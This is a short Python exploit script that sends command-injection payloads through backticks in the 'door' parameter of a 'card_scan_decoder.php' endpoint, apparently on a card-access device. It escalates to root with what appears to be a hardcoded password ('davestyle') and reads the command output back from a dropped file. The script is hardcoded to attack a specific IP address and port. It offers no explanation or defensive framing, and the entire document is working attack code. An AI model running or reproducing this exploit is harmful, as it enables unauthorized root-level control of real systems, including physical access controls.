import requests

import threading

import random

import sys, time


class Exploit(threading.Thread):
    def __init__(self, host, port, cmd):
        threading.Thread.__init__(self)
        self.host = host
        self.port = port
        self.cmd = cmd
    
    def run(self):
        try:
            requests.get('http://'+self.host+":"+str(self.port)+'/card_scan_decoder.php?No=31&door=%60touch test.txt && test.txt > hello%60')
            frontend = '''echo davestyle | su -c %s'''%self.cmd
            requests.get('http://'+self.host+":"+str(self.port)+'/card_scan_decoder.php?No=31&door=%60'+frontend+' > test.txt%60')
            showme = requests.get('http://'+self.host+":"+str(self.port)+'/test.txt')
            print(showme.content)
        except Exception as e:
            print(e)
            return


if __name__ == '__main__':
    thread = Exploit('50.253.233.46', 85, sys.argv[1])
    thread.start()
